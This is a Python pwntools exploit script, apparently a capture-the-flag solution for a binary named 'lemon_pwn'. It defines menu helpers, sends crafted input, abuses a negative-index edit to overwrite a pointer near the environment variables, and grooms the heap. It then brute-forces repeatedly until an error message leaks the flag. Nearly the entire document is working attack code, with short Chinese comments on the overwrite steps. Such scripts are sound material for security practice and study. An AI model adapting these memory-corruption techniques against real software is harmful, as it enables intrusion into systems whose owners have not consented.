# -*- coding:utf8 -*-
from pwn import *

pc = "./lemon_pwn"
libc = ELF('./ld-2.26.so')
context.binary = pc
context.terminal = ["gnome-terminal", '-x', 'sh', '-c']
#context.log_level= 'debug'

ru = lambda x : p.recvuntil(x,timeout=0.2)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline() 
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
shell= lambda :p.interactive() 
ru7f = lambda : u64(ru('\x7f')[-6:].ljust(8,'\x00'))
rv6 = lambda : u64(rv(6)+'\x00'*2)
menu = lambda x:p.sendlineafter(">>> ",str(x))

def lg(s, addr):
	print('\033[1;31;40m%20s-->0x%x\033[0m' % (s, addr))

# def bp(bkp=0, other=''):
# 	if bkp == 0:
# 	    cmd = ''
# 	elif bkp <= 0x7fff:
# 	    cmd = "b *$rebase("+str(bkp)+")"
# 	else:
#         cmd = "b *"+str(bkp)
#         cmd += other
#         attach(p, cmd)

def add(index, name, size, content):
	menu(1)
	ru("index of your lemon")
	sl(str(index))
	ru("name your lemon:")
	sn(name)
	ru("of message for you lemon:")
	sl(str(size))
	ru("Leave your message:")
	sn(content)

def add2(index, name,size):
	menu(1)
	ru("index of your lemon")
	sl(str(index))
	ru("name your lemon:")
	sn(name)
	ru("of message for you lemon:")
	sl(str(size))

def show(index):
	menu(2)
	ru(" your lemon :")
	sl(str(index))

def dele(index):
	menu(3)
	ru(" your lemon :")
	sl(str(index))

def edit(index, content):
	menu(4)
	ru(" index of your lemon")
	sl(str(index))
	ru("Now it's your time to draw and color!")
	sn(content)


def exploit():
	sl("yes")
	sa("Give me your lucky number:",p64(0xcff48db8b7c913e7))
	sa("tell me you name first:",p64(0)*2+'\x00\x20\x00\x00\x01')
	ru("0x")
	flag = int(rv(3),16)
	success(hex(flag))

	flag2 = flag+0x1000-0x40  # flag地址的末字节
	success(hex(flag2))
	pause()

	payload = 'a'*0x138+chr(flag2&0xff)+chr((flag2>>8)&0xff)  ##覆盖环境变量的位置
	success(payload.encode('hex'))
	edit(-260,payload)

	add(0,'desh',0x20,'a')
	dele(0)
	add(0,'desh',0x10,'a')
	add2(1,'desh',0x114514)
	dele(0)
	payload = p64(0x20)+p64(0x450)+p64(0x100000018)+p64(0x0)
	add(0,'desh',0x20,payload)
	dele(0)
	dele(1)
	add(0,'\xa0',0x20,'\xa0')
	add2(1,p64(0x10),0x20)

while True:
	try:
		p = process(pc)
		exploit()
		aaa = ru("or corruption (!prev):")
		print aaa
		if "flag" in aaa:
			break
	except:
		p.close()
		continue
